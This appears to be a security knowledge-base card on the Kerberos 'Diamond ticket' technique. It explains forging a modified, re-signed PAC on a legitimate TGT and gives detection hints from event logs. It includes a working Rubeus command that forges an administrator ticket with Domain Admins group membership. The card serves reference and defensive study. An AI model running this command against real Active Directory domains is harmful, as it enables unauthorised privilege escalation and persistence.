---
id: diamond
type: technique
label: "Diamond ticket"
phase: "persist"
tools: ["rubeus"]
cve: null
detect: "Subtle, hard-to-spot field inconsistencies on an otherwise valid TGT."
mitre: "T1558.001"
tag: "new"
---


# Diamond ticket

### Affected object / attribute
**A legitimate TGT** whose **PAC is modified and re-signed** with the `krbtgt` key.

### Concept (deep)
Request a **real TGT**, modify its PAC (groups, user), and **re-sign**. Because the TGT request is real, a **4768 is logged**, making it harder to distinguish from normal traffic than a from-scratch Golden Ticket.

### Commands
```bash
Rubeus.exe diamond /tgtdeleg /ticketuser:administrator \
  /ticketuserid:500 /groups:512
```

### Detection
**4768 followed by 4769** for a user whose **PAC group membership exceeds AD truth**; PAC validation anomalies.

---
